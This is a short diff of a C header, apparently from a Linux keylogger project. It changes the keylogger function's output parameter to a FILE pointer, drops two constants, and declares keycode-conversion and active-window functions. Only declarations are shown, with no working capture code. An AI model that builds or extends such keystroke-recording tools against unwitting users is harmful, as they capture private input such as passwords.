@@ -66,9 +66,6 @@
 #include <stdlib.h>
 #include <string.h>
 
-#define NUM_EVENTS 128
-#define NUM_KEYS 71
-
 /**
  * Tries to find the filepath of a connected keyboard
  * \return malloc allocated filepath of keyboard, or NULL if none could be
@@ -83,7 +80,9 @@ char *get_keyboard_event_file(void);
  * \param keyboard The file descriptor for the keyboard input file
  * \param writeout The file descriptor to write keystrokes out to
  */
-void keylogger(int keyboard, int writeout);
+void keylogger(int keyboard, FILE* writeout);
+
+void convert(int keycode);
 
 void searchActiveWindow(void);
 
